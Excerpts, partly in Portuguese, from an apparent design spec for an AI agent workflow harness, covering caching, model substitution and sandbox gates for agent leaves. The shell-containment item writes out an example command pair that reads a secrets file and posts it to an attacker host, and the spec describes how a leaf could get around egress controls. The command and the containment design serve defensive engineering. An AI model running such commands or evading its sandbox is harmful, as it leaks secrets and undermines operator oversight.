...
| `parallel` | `parallel()` | `branches:[node\|ref], retries?, required?` | **BARRIER** fan-out — awaits ALL branches. Use only when the next node needs the whole set. Effective width is capped at runtime by the unified budget (§7.1); there is no per-node `max_items` literal — width is bounded by the *resolved* branch count vs remaining lifetime. `retries` (opt-in, default 0, H7/#77) re-spawns a DEAD branch fresh, up to the ceiling, before the panel settles — see §7.6. |
...
**The same rule, one level down (issues #66/#82).** `_validate_node_shape` only ever walked `nodes[]` — a `parallel` branch, a `judge_panel` attempt/`synthesize`, a `pipeline` stage or a `loop_until_dry`/`gate` `body` accepted and silently ignored any field, the exact hole #73 closed at the top level (#66 found it first for `schema_ref`/`model` on a branch: `run_parallel` collects every branch with **no** schema, so a per-branch schema or route validates and is thrown away). `nodes.NESTED_SHAPES` is a closed, per-shape allow-list drawn from the real readers (`strategies.py`/`gates.py`/`prompts.branch_prompt`) — `parallel.branches[i]`/`judge_panel.attempts[i]` read `prompt` only; `pipeline.stages[i]` reads `prompt, schema/schema_ref, retries, max_iterations` (matching the workflow-authoring skill's published "and nothing else"); `judge_panel.synthesize`, `loop_until_dry.body` and `gate.body` read `prompt, schema/schema_ref`. `schema_nested.validate_nested_shapes` walks every declared shape and refuses an unknown field or a removed one (`label`/`phase`/`min_success_ratio`) with the same didactic mould as the top level. **Anti-drift rule (issue #82):** `backend/tests/test_workflow_field_consumers.py`'s `NESTED_FIELD_CONSUMERS` is the enforced contract, checked structurally against `NESTED_SHAPES`.

**Named schemas in rigor payloads (#87).** `judge_panel.synthesize` and `loop_until_dry.body` resolve an inline `schema` object, `schema: "NAME"`, or `schema_ref: "NAME"` through `nodes.resolve_schema`, including the reserved builtin names. The named definition must exist; an unknown name or wrong type is refused before any leaf (`schema_type`/`schema_ref` with the nested field path), and declaring both fields is refused (`schema_xor`). #82 already prevented the old raw-string runtime failure by refusing every non-object; #87 replaces that restriction with a real reader. The **resolved definition** enters the cell hash, so changing a schema under the same name invalidates the cell. Inline and absent schemas keep their legacy keys byte-for-byte: the loop replaces its existing schema slot; the panel normalizes a copy of `synthesize` only for named forms. Cache preview uses these same strategies. No migration or global cache-version bump is needed; measurement and scope limits: [2026-09-13 schema investigation](../history/reviews/2026-09-13-wave10-schemas.md).

**`id`/`type` on an embedded shape: warned, not refused (decisão do coordenador, por delegação do dono, 2026-09-05).** Both mirror the top-level node mould but are never read — a branch/attempt/stage is not addressable by id (results are positional), and the shape is always agent-like already, so `type: "agent"` changes nothing. The first cut of #82 refused both; the coordinator reversed that for `id`/`type: "agent"` specifically after the review found 3 of the owner's own saved templates and 64+ call sites across this repo's own test suite used the idiom — refusing it would have broken the library on upgrade for a field that never changed engine behaviour. `schema_nested.py` now accepts both silently at the VALIDATION layer; `lint._lint_nested_id_type` (issue #49's lint pipeline, `WorkflowService.start`'s `spec_warnings`) raises one `nested_id_type_ignored` warning per node instead, keeping "no field silently ignored" true without blocking acceptance. A `type` value OTHER than `"agent"` stays refused (`field_value`): a branch/attempt/stage can never nest a different node type, so any other value is misleading rather than harmless drift.
...
- **Loop-until-dry** — `loop_until_dry` keeps a `body` running until K consecutive empty rounds, `max_rounds`, or its own `budget` (no premature stopping). `budget` (issue #73 follow-up) is an integer token CEILING for this one node — checked between rounds, never mid-round, against the sum of `tokens_in + tokens_out` its own leaves have cost so far — never the run-level token budget (§7.1), which is a separate axis. A round that is both the K-th empty AND over budget is still a complete, legitimately-dry harvest (dryness wins). Reaching it any other way stops the loop (no more rounds spawn) and records an ADVISORY fault naming rounds run and tokens spent; it does not pause the run, and the shortened harvest **is cached**, the same as a `max_rounds`-capped one — `budget` is already part of the cell's identity, so a raised ceiling is simply a different cell, and not caching would only punish a resume of the same run. The one exception: if every round so far genuinely died (no real harvest to cache), the node's output is `None`, never `[]`, mirroring the run-level token-budget pause. Leaves that report no usage at all (a cancelled or timed-out round) count 0 toward this node's budget, so it can under-count what a round actually cost — `max_rounds` still bounds the loop regardless.
...
`content_hash = sha256(meta.name+version, canonical_node_spec, resolved_inputs, workflow_args)`. We key lookups on the node's **content** (its canonical spec + its resolved inputs), **not** a positional call-site ordinal — so reordering or inserting a node doesn't false-miss the others. Since #90, nested cells wrap that content hash with their structured calling-node scope (§6.9); top-level hash bytes stay unchanged.
...
CREATE TABLE workflow_node_cache (
  ...
  node_id      TEXT NOT NULL,     -- scoped display id (or item#stage, §6.4)
  node_scope_json TEXT,           -- structured call path; [] = root, NULL = legacy unknown (§6.9)
...
**Colisão de path entre células IRMÃS é um fato à parte (#65).** `artifact_paths.RunPaths` indexa `path → node ids deste run` — chaveado por PATH (em C3-barrier do experimento #62 as duas células mediram o mesmo arquivo final e guardaram o MESMO sha: digest igual é a assinatura do dano, não prova de segurança) e por NODE ID (por content hash, a linha velha de uma célula `identity_changed` pareceria uma irmã e suprimiria uma invalidação legítima); a metade in-run decide no `cache_store`, sob lock, comparando duas DECLARAÇÕES entre si sem olhar o disco, e escreve um advisory por path nomeando as duas células e o remédio, enquanto a metade do resume é derivada das linhas do próprio run (`cache_artifact_rows`), porque a célula que o irmão invalida é a gravada PRIMEIRO, num estirão anterior, e uma flag na segunda nunca a alcançaria. As DUAS perguntas que o índice responde são chaveadas de formas diferentes, e confundi-las foi o bug que a revisão adversarial pegou: **avisar** é por PATH (sha igual é a assinatura do dano), mas **manter o replay** é por CONTEÚDO — `explained_by(path, sha_do_disco, exclude=dono_da_entrada)` pergunta se OUTRA célula deste run guardou exatamente o que está no disco AGORA (`artifact: shared_path`, advisory por path no seal, contado por célula), porque "este path é compartilhado" é verdade para sempre depois que passa a ser, e uma isenção que nunca expira daria passe livre permanente à reescrita de um terceiro. **Tudo o mais volta a ser `artifact_changed` + re-spawn** — a mutação externa, a linha-fantasma de um nó renomeado, o `missing`, e o path meramente compartilhado cujo conteúdo atual ninguém do run escreveu; o `exclude` é o dono gravado na própria entrada, então o fantasma do PRÓPRIO nó não explica a mudança que causou. O trade-off é deliberado e falha para o lado do dono: se o ÚLTIMO writer não gravou manifesto do estado final, nada explica o disco e a célula re-spawna. O dono gravado é o id COM ESCOPO (`sub[build]:write`), porque engines aninhados dividem o cache sob um `run_id` só. Antes da #90 a coluna `node_id` ainda guardava o id cru; desde então a coluna também usa a chamada, e `node_scope_json` preserva a estrutura sem depender do rótulo.

**O `cache_preview` (§6.6) aplica a mesma regra antes de pagar**: uma célula que daria hit mas cujo manifesto não bate entra em `invalidate` com `reason: artifact_changed` e soma seu preço em `tokens_to_repay` — e carrega o MESMO índice de paths do run, porque ele anuncia o que o engine vai fazer e não pode contradizê-lo. Segue read-only — re-mede o filesystem, não escreve linha nenhuma.
...
**O contrato, explícito.** A chave (§6.1) é o CONTEÚDO da célula: `meta.name`/`version`, a spec canônica do nó (prompt, schema, rota, timeout, retries e, condicionalmente, `max_iterations`) e as entradas resolvidas. Muda a chave → célula nova. Além da chave, recusam um hit: `artifact_changed` (§6.7), tombstone/ausência de linha (§6.2) e proveniência de chamada insuficiente (§6.9). Política e versão continuam apenas carimbos, nunca provas de autoria.
...
- `policy_hash`: sha256 **canônico** (ordenado **e deduplicado** — apagar uma root listada duas vezes não muda capacidade nenhuma) da política EFETIVA de todos os gates que `sandbox_dispatch` aplica — `allow_terminal`, `allow_search` (#55), `mcp_allow`, `fs_allow` (path **e** modo `ro`/`rw`) e `egress_allow`. Ordenado porque reordenar o arquivo do operador não é mudar de política; todos os gates porque omitir um faria "mesma política" uma afirmação que o harness não sustenta. A inclusão de `allow_search` muda também o fingerprint padrão legado: antes a busca era permitida implicitamente. Os marcadores internos fixos `egress_scope: "all_hops"` (#56), `egress_dns: "pinned_public"` (#13), `mcp_authority: "registered_entry_exact_server"` (#115) e `author_time_scope: "registered_entry"` (#130) também entram no hash: identificam a allowlist por redirect, o pinning público do transporte próprio, a autorização MCP pela identidade original registrada e a recusa de entradas author-time nos consumidores delegados, não opções do operador nem um inventário durável de registros. Assim, um carimbo anterior conhecido diverge mesmo com o mesmo JSON; a mensagem descreve outra política efetiva, sem atribuir alteração ao usuário. O replay continua permitido com advisory `policy_changed`, sem reexecutar a célula. NULL permanece desconhecido, sem presumir versão histórica. É um hash: o ledger nunca vê uma root nem um host.
...
### 6.9 Identidade por chamada e compatibilidade conservadora (#90)

**Conteúdo igual não equivale à mesma autorização humana.** Duas chamadas `a` e `b` do mesmo template, ou raiz e filho com `(meta.name, meta.version)` iguais, podiam compartilhar a célula de um checkpoint com prompt idêntico. O mapa de respostas da #78 já distinguia as chamadas, mas o hit de cache acontecia antes da consulta ao mapa. O cache agora usa `sha256("invocation-v1", [calling_node_ids...], legacy_content_hash)` para cada célula aninhada; a raiz conserva os bytes da chave anterior. A lista é estruturada: `sub[...]:` é somente apresentação, nunca entrada recuperada por parsing de um rótulo.

**Prova durável mínima.** Toda conclusão nova grava `node_scope_json` no mesmo INSERT cercado da célula, do manifesto e do custo. `[]` significa raiz observada, `["a"]` a chamada `a`, `NULL` significa autoria legada desconhecida. O schema adiciona a coluna automaticamente e de forma idempotente; não preenche escopos retroativamente. Checkpoints, inclusive na raiz, só replayam com scope e `node_id` correspondentes. `harness_version`, o único template da spec atual e o mapa de respostas do último comando não provam quem produziu uma célula antiga: um pivô pode ter removido o irmão ou trocado seu `ref`.

**Legado é leitura, não cópia.** Uma célula aninhada antiga só pode ser alias de leitura quando todas as entradas de um manifesto não vazio têm o `owner` explícito do harness correspondente à chamada, e o `node_id` cru da linha também corresponde. Entradas sem owner, mistura de donos, JSON inválido ou ausência de manifesto não demonstram autoria. O alias conserva o `source_hash`: replay, carimbos e rechecagem de arquivo leem a linha original, e `tokens_saved`/`tokens_to_repay` consultam o custo original. Nenhuma célula nem custo é copiado, e repetir resumes não aumenta o ledger. A escrita só ocorre quando há execução real ou nova resposta humana. Checkpoints nunca tiveram essa prova por artefato: um manifesto não substitui seu scope explícito. Células legadas comuns da raiz conservam o contrato anterior de replay por conteúdo.

**A recusa é explícita e pode exigir trabalho novamente.** Sem prova, o evento `cache.missed` usa `legacy_scope_unproven`, o run registra advisory e o preview registra `unknown` (também `cost_unknown` para leaves), sem atribuir o preço de um possível irmão. Um checkpoint pausa com `cache_compatibility` explicando que precisa de nova resposta para o `node_id` mostrado. Não há promessa de preservar toda aprovação antiga ou de zero novas perguntas. Após responder/rodar sob o novo scope, resumes repetidos e reabertura do banco reusam a nova célula normalmente. Sem correspondência de conteúdo, o harness não reconstrói uma história de autoria que nunca foi gravada.

**Relatórios por chamada.** `fold_nested`, custos e preview usam `sub[<calling node>]:<child node>`; custos, entradas detalhadas de preview e payloads de pausa guardam o `template` separadamente. Duas chamadas do mesmo template deixam de sobrescrever a atribuição de custo. Os custos aninhados também carregam `node_path` estruturado. Todos os ids locais são reservados antes da execução: se o label de um filho colide com um id autorado ou com outro label, o relatório aloca um sufixo derivado de `node_path` e verifica a unicidade inclusive contra ids que imitem o sufixo. O mesmo dono sempre recupera a mesma key ao agregar mais custo; rotas divergentes continuam sem preço atribuído a um modelo único. Labels comuns ficam inalterados e a ordem raiz/filho não pode fundir nem apagar uma conta. O histórico de miss filtra scope persistido além do rótulo. Os labels de relatórios já persistidos não são reescritos. A ambiguidade preexistente de ids autorados que imitam uma chave humana `sub[a]:cp` continua uma limitação do protocolo textual de respostas (#78), separada do hash estruturado; não há novo parser ou migração dessas chaves nesta fatia.
...
`sub[call]:` when a nested run is where it happened.
...
**A `workflow` node's `ref` that loads but fails `validate_spec` is a NAMED fault too (issue #79, H9).** Every other cause of a null node above goes through `engine.record_fault`; a template that loads and then fails validation used to be the one exception — `logger.warning` only, `None` returned, the node null with zero causal signal in `faults`. `run_workflow` now records `<node.id>: nested template '<ref>' rejected: <rule>[ (<node_id>.<field>)]` before nulling — the rejected `SpecIssue`'s **rule code** and node/field path, never `.message`/`.example` (didactic prose that would echo the author's spec text into the fault/audit trail). `cache_preview`'s own walk of the same ref (§6.6 above) already surfaces this ahead of the run as `nested_template_invalid`; this closes the matching gap at run time.
...
| **Per-branch fresh re-spawns (`parallel`)** | `retries` on the `parallel` node: default **0** (opt-in; distinct from `agent`'s default 1), same cap. | A DEAD branch — `None`, never a branch that answered `""` — is re-spawned fresh (`parallel_retry.py`), same route, no correction, up to `retries` times; a winner retires the dead attempts' faults (`mark_recovered`) exactly like the `agent` series. No empty-answer class (branches are schema-less) and no exhaustion-triggered `route_fault` pause (§7.7 stays `agent`-only): a branch that stays dead after every attempt is today's #72 hole, unchanged. Re-spawns run SEQUENTIALLY inside the barrier's own collect loop, one dead branch at a time — worst case `N_dead × retries × leaf latency`, bounded by `LEAF_TIMEOUT`/the node's own `timeout`, never concurrent with each other. A re-spawn's own spawn can still be refused by the unified budget (`LifetimeExhausted`/`TokenBudgetExhausted`) exactly like any other leaf; caught at the re-spawn site so a refusal settles that one branch as dead without aborting the barrier's collection of every other branch already in flight (#77 adversarial review, HIGH-1). |
...
1. an answer that reads as a route answer — a routing object **or the word `abort`** — keyed to a node whose TYPE takes routing, on a run not paused at `route_fault`. Gated on "does this type take routing" rather than on "is it a checkpoint", because a checkpoint one level down is answered under a namespaced key (`sub[<workflow node>]:<id>`, #78 — the shape a nested *route* also uses since #90) that names no node of the parent spec, so its answers reach the decision with no type that spec can name — a human answering such a gate `"abort"` must not have it refused as a misplaced route;
...
4. a **nested** route (`template` in the payload) — v1 says no: the node is not in the spec a resume sends, so *"the route lives in template X; adapt the template"*. Checked BEFORE the node lookup, or the namespaced `sub[call]:node` id would come back as a plain "no such node" and mask the reason — and AFTER the `abort` word, since an abort edits nothing: a nested route cannot be answered with a route, but it can always be answered with a cancel;
...
#### 7.7.2 The CATALOG SUBSTITUTION: a model that does not EXIST is corrected once, never silently (issue #85, W9-E8)

§7.7 and §7.7.1 both answer a route that **died**; neither answers a route that was **never real**. A `model:` slug is a free field nothing validates (`schema.py` closes `tier`, not `model`), so a typo or a discontinued id reaches the provider and comes back as a 404 — which, before this, classified as nothing at all: the leaf died alone, and a node that had declared `retries` burned every attempt proving the same nonexistent slug still did not exist before pausing `route_fault` for a human. The owner's decision on #54 changes that: a nonexistent model chosen by the author is **`agency`** (the harness has a catalog and should not make that mistake), and one that came from a human instruction must be **corrected with a warning**, never turned into a dead run. So `providers/errors.py` gains a fourth structural category, `model_not_found` — matched on the SDK class's `(module, name)` — required on every route into the category — plus the payload's `code: model_not_found`, or, for the anthropic shape, a 404 whose body names `not_found_error`. Never `isinstance` against an optional extra and never a regex over prose — and `engine.substitute_model` runs **before** the pause, on that category and only that one. The substitute comes from the **operator's tier map** and from nowhere else: same provider, the tier the node declared or the nearest above — and when the node declared **no** tier, the tier this SESSION was launched at (`anchor_tier`: the `MODEL_TIERS` name whose entry resolves to the session's own default provider+model, threaded from the entrypoint as `default_route`). No anchor — no default route, a default on another provider, or one the operator never mapped — means **no substitution**, because guessing a tier would be the harness choosing a capability nobody named. The candidate must also be present in the OFFLINE catalog (the price snapshot — `catalog/catalog.py` is a live fetch and must never be reached from a leaf's dispatch path, or a wrong slug would also depend on the provider's `/models` endpoint being up, which is `environment` and not authoring), priced (an unreadable bill refuses, doctrine 2 of §7.7.1, so a subscription is never a candidate and a dynamic provider substitutes nothing without an operator override), and never the dead slug itself. Exactly **one** substitution per node — "your model does not exist" must never become a walk down a catalog on somebody's bill — and only for a top-level `agent` node whose id is the one that died, for the same CACHE reason §7.7.1 gives: `run_agent` puts the resolved model in the cell key, so the substituted attempt is a NEW cell and the dead one stays replayable. Mechanically it re-uses the envelope's own seam (`_reroute_pending`/`take_reroute`), so the extra leaf counts in `leaf_respawns` and `apply_reroutes` folds the correction into the spec a resume reads. **Never silent, four ways:** the death is recorded as an ordinary fault and *held* for the discount (granted only if the substitute actually answers — a substitution that dies too launders nothing); the correction is an **advisory** fault, so a run whose one defect was a typo can still certify while the reader is still told; the certified template stamps `meta.model_substitutions` as `{node, from, to}` rows — **earned, not asserted**: the row (and the `agency` insight derived from it) claims a correction WORKED, so it is held until the new model answers (`mark_reroute_recovered`), and a substitute that died too publishes nothing while keeping its advisory and its audit line. The holding is per-STRETCH and in memory: a run that pauses or is cancelled between the substitution and the substitute's answer publishes no row at all, and the **advisory fault is the durable leg** that still reaches the next stretch (`carried_advisory`) and the reader — carried ACROSS stretches by `carried_substitutions` for the reason `carried_rerouted` is (the stretch that certifies is usually not the stretch that substituted) — and the node also appears in the channel-blind `meta.rerouted_nodes`, correctly: it really was moved, and the substitution list beside it is what says which model replaced which; the audit ledger gets the typed `node.rerouted` of #64 under a third channel, `catalog`, kept distinct from `route_envelope` because the authority differs (nobody writes a fallback list for a typo). And the run teaches the loop: one `candidate` insight per substitution, `mechanism=validation` + `SIGNAL_SPEC_SHAPE` + `rule:model_not_found` at full confidence, which `failure_taxonomy` resolves to **`agency`** — the owner's decision expressed as evidence rather than asserted by the caller.

**One documented exception to "never prose", and the dogfood is why it exists.** Live run T17 (2026-09-05) pointed a node at a model id OpenRouter does not serve and the harness behaved as if #85 had never been built: it burned the node's whole `retries` series and paused on the GENERIC route_fault with `error_kind: null`, because the captured body is `{"error": {"message": "<slug> is not a valid model ID", "code": 400}, "user_id": …}` — `code` is the INTEGER 400, the HTTP status echoed back, which says nothing the status did not already say. There was no structural signal to read, on the one provider most likely to be handed a wrong slug (an OpenRouter id is `vendor/model`, and a wrong vendor half looks exactly like a right one). So `providers/errors.py` gains `_MESSAGE_FINGERPRINTS`, a **table** rather than a reading of prose, and five bounds are what keep it from becoming the rule it excepts: the key is `(module, class, status)` so a sentence from any other shape is not the shape that was measured; every entry is COPIED from a real body a real run received, with the date (the hypothetical entry this replaces is exactly the mistake the dogfood caught); matching is an exact substring with `in`, never a regex or a normalisation, so widening it is always a visible edit; it is consulted ONLY where `body.error.code` is an int equal to the status, i.e. where the provider positively told us it has no code of its own; and it is a closed constant in the module, loaded from no config, no spec and nothing an agent can write. The identity gate still runs first, so a tool result quoting the sentence back at us moves no route.

**And the payload accessor tolerates BOTH SDK shapes, which is what the second dogfood cost.** The first fix shipped with the fingerprint table right and the reader wrong: it pasted the RAW HTTP body into its fixture, but the openai SDK **unwraps** the `error` layer before the exception exists (`_make_status_error`: `data = body.get("error", body)`), so at runtime `exc.body` is the inner object — `{"message": …, "code": 400}` — with no `error` key left to descend, while **anthropic keeps** its `{"type": "error", "error": {…}}` envelope. An accessor reading only `body["error"]` is therefore correct for anthropic and silently `None` for every openai exception, and the classification passed every unit test while staying dead in production twice. `_error_payload` now uses the openai SDK's own expression, `body.get("error", body)` — it descends an envelope when there is one and stays put when there is not — and the code is read from the SDK's own `.code` attribute first, with the payload as the fallback for a duck-typed exception. The guard against a third round is structural rather than textual: every category in `tests/test_provider_errors_no_import.py` is now pinned against an exception built by the SDK's OWN `_make_status_error_from_response` from a raw body — the same path a live 4xx takes — so a hand-built fixture can no longer disagree with the live path without a test saying so.

**A node that declared NO routing at all is deliberately excluded.** Its dead slug is the SESSION's default, not the author's choice, and every recording surface here blames the SPEC — so substituting would file an operator's profile configuration under the name of whoever wrote the workflow. The harness records the advice that names the two real remedies (fix the profile default, or declare a route on the node) and refuses.

**Every refusal lands on the §7.7 pause, not on a degraded run.** `model_not_found` is a deterministic-within-the-route death exactly as `auth_failed` is, so `should_pause_on_route_fault` returns True for it and `substitute_model` is merely consulted first. Without that the correction would have *removed* a guarantee: a run with no tier map would schedule every remaining node onto a model the provider had already refused, where before it stopped after one leaf and asked a human. (`_NEVER_A_SERIES` therefore subtracts both kinds BY NAME rather than deriving itself from `NO_RESPAWN_KINDS`, so the next kind added there cannot silently make its own pause unreachable.) So: no tier map, no anchor, a candidate nobody prices, a cross-provider hop, a nested template, a node that authored no route, a run already stopping, a second substitution in the same stretch, or a substitute that dies too — all of them pause. The failure mode of the whole mechanism is "the harness did not help", never "the harness ran something nobody authorized".

**Three residuals, named rather than hidden.** (a) The once-per-node latch is per-STRETCH, unlike §7.7.1's durable brake (doctrine 5): a resume may substitute the same node again, one tier further up. Bounded by the POOL rather than by a counter — the tier map has at most three entries and every step is announced — and honest, since a stretch that substituted and then paused for some other reason has not yet proved the new model wrong. (b) The anthropic 404 `not_found_error` is the provider's answer for *any* missing resource, so a misconfigured `base_url` or a wrong API path would classify as `model_not_found` too; the cost is bounded to one extra leaf on a real model that then fails the same way, and MEDIUM-2's earned publication keeps such a run from ever stamping a substitution or teaching the loop. (c) A message fingerprint is the provider's own wording and the provider may change it: the failure mode of a stale row is that #85 goes quiet again for that gateway and the run pauses as it did before — never a wrong substitution — and the same dogfood that captured this row is what would catch the next one.
...
2. **egress gates** — `web_fetch` requires its requested host to match `policy.egress_allow`, in addition to the fetcher's SSRF checks; an empty allowlist denies it. The same exact host match, after HTTPX lowercase ASCII/IDNA2008 canonicalization, applies to the initial URL and every redirect, before DNS or connection (#56); subdomains require their own entries, and wildcards grant nothing. The sandbox copies the caller arguments into an internal typed mapping whose host tuple is outside the JSON keys; the registry preserves that mapping, and `web_fetch` forwards its trusted `allowed_hosts` to the fetcher. Authored keys/kwargs cannot widen or revoke the restriction. The fetcher follows redirects manually even with a client configured to follow them automatically. `allowed_hosts=None` preserves unrestricted public-web use outside the sandbox; `()` denies every destination. Allowed destinations still pass SSRF validation before connection. The owned fetch transport also pins each physical connection to a fully validated public DNS snapshot, preserving logical Host/SNI and refusing an active proxy before DNS (#13; [transport contract](10-web-fetch.md)). `web_search` is denied unless the operator sets `"allow_search": true` in `workflow_policy.json` or `LOHRA_LEAF_ALLOW_SEARCH=1` (#55). Search sends the query to its configured backend; this capability opt-in is independent of `egress_allow`, so allowing a fetch host alone never enables search. JSON requires a real boolean; env accepts `1/on/true/yes` (case/whitespace normalized), rejects garbage with a warning, and composes by OR with the file (explicit false never revokes a file grant). With no file or a malformed file, the env can still opt in. An explicit `WorkflowService(policy=...)` remains authoritative and does not inherit file/env grants. Neither the spec nor a leaf can grant the capability. Tainted run → deny **all** web egress regardless of either grant. Search is also removed from leaf tool definitions whenever denied, including under taint; dispatch still refuses a scripted or stale tool call.
3. **shell + MCP containment (issue #4)** — `terminal` and every `mcp_*` tool are **denied by default**. This used to read "unchanged from `subagent_dispatch` (dangerous shell auto-deny, `_CHILD_EXCLUDED_TOOLS`)", which was **wrong**: neither list covers `terminal` or `mcp_*`, so a leaf could run `cat ~/.lohra/.env` / `curl -d @secret https://attacker.test` and route around controls (1) and (2) entirely. Opt-in is the **operator's** — `"allow_terminal": true` and `"mcp_allow": ["<server>"]` in `workflow_policy.json`, or `LOHRA_LEAF_ALLOW_TERMINAL=1` / `LOHRA_LEAF_MCP_ALLOW=srv1,srv2` — and **never** a spec field: a leaf that may run a shell has transitively every capability the other controls deny. `mcp_allow` matches the **exact original configured server identity** in the trusted registry entry (`ToolEntry.toolset = "mcp-{server}"`, #115). Public names keep their presentation slugs, but `github` cannot authorize `github_enterprise`, and `gh-team`, `gh_team`, `GitHub` and `github` are distinct identities. Policy file/env loading preserves those identities; schemas, aliases and tool arguments cannot supply provenance. Tainted run → denied regardless of the opt-in. Gated on **both surfaces** (`sandbox_tool_definitions`): what the dispatch would refuse by registered identity or capability name is also stripped from the leaf's tool definitions, so a leaf never burns an iteration off its 50-cap calling a tool it can only be refused — the same strip-and-refuse shape `delegate.py` uses for `_CHILD_EXCLUDED_TOOLS`. `_CHILD_EXCLUDED_TOOLS` and the dangerous-shell auto-deny still run **underneath** this wrapper.
4. **auto-deny + exclusions** — unchanged from `subagent_dispatch` (dangerous shell auto-deny, `_CHILD_EXCLUDED_TOOLS`). An ordinary non-MCP entry whose name is outside the other gated classes (fs, egress, `terminal`, `mcp_*`) passes through to them — the containment is per capability class, deliberately, so an ordinary stateless tool added to the registry later is not silently broken.

**MCP dispatch and registration (#115).** Advertisement and preflight use the same registry-backed predicate as execution. Unknown MCP names and missing provenance are denied before an opaque base can claim authority. The registry then captures an entry under its lock, checks every active guard against that entry, and invokes that same entry's handler outside the lock. It never authorizes one entry and then looks up another handler by name. The private guard stack is installed inside each executing worker, composes nested restrictions by intersection, and restores the previous stack in `finally`, including exceptions. It preserves subagent, approval and taint wrappers; neither JSON nor a broader inner wrapper widens the outer grant. A trusted MCP entry aliased as `terminal` must satisfy both gates. Frozen advertised definitions/prompts are not rewritten after refresh; dispatch still checks current authority.

This entry-to-handler guarantee covers dispatch chains that reach `ToolRegistry`; an arbitrary Python callback supplied by an embedder remains trusted, and passing `tool_registry` to preflight does not sandbox that callback's own effects.

**Author-time scope (#130).** A trusted entry marked `author_time_only` is also
removed from leaf definitions and refused by the same-entry guard, even when a
custom Agent factory reaches the registry without the default subagent wrapper.
Metadata composes with MCP and the other leaf gates; an MCP grant cannot authorize
an author-only entry. Default child/server consumers additionally retain their
legacy name exclusions for depth/stateful tools, in union with the metadata.
Operator JSON, schemas and tool arguments do not set the internal flag. The author
remains allowed, and definitions/prompts already frozen remain unchanged after
re-registration. Custom registry integrations supply the same explicit catalog
to every preflight wrapper; arbitrary embedder callback effects remain trusted.
This semantic enforcement participates in the policy stamp as
`author_time_scope: "registered_entry"`. It records harness semantics, not a
durable inventory of every tool registration or metadata change. Known older
stamps replay paid output with a policy-change advisory and zero respawns; NULL
still carries no invented provenance.

MCP listings are prepared before publication; registry validation checks both existing entries and earlier entries in the same batch under one lock. Implicit foreign-owner name collisions raise explicitly without publishing a partial listing. Builtin collisions still keep the builtin, and tool-slug collisions within one server listing still keep the first original tool. Same-server updates and public names remain supported. The trusted Python `override=True` registry API is retained, but a replacement receives no grant from the former owner. Server deregistration selects and removes by ownership under one lock. A failed connect preserves preexisting entries; refresh retains its existing nuke-and-repave contract: the old server listing is removed before re-listing, so failure leaves no partial new listing and does not promise to restore an old snapshot. The session remains available for a later refresh. These registration rules concern registry authority; author-time scope is enforced separately as described above (#130), without creating an OS sandbox.

Host identity uses the public `httpx.URL(host=...).raw_host` contract for both URL hosts and policy entries: Unicode and equivalent ASCII IDNA spellings authorize the same destination, while `straße.test` and `strasse.test` remain distinct. Entries are hosts, never full URLs or authorities; userinfo, port suffixes, paths and queries cannot become a host grant. Invalid entries grant nothing; IPv6 literals retain support. The policy fingerprint uses the same canonical host identities, sorted and deduplicated, so equivalent spellings do not report a capability change.

Compatibility outside the sandbox preserves the default client's public-web body/error behavior without a host restriction. An injected client with `follow_redirects=True` is a deliberate exception (#56): it previously bypassed manual hop checks and now obeys them even with `allowed_hosts=None`; identical behavior is not claimed for that unsafe configuration.
...
arbitrary server/tool text from the advisory. Search disabled by policy carries
`search_disabled` (#55); an off-list redirect carries `egress_redirect_not_allowed`
(#56), while the initial host keeps `egress_not_allowed`. The redirect tool error
names the refused host and redirect hop, omitting credentials, path and query;
the typed metadata, advisory and audit carry only the closed reason, never the
host/URL. Taint keeps `tainted_egress`. All flow through these same typed counters
and redacted audit records, including when the leaf omits the refusal from its
final response or the optional audit sink is disabled.
...
**Reused as-is:** `make_child_factory` base isolation, `subagent_dispatch` auto-deny + `_CHILD_EXCLUDED_TOOLS`, `validate_public_url` SSRF preflight plus the owned public-address transport (#13, after the per-hop operator host gate, §8.3), `compose_dispatch` intercept pattern, `tool_result`/`tool_error` envelope, SessionDB lineage + `compression_locks`, `run_conversation` kernel + steer-into-tail, the core's capped pool + queue-when-over-cap + terminal-only eviction + `cancel`/`shutdown`.
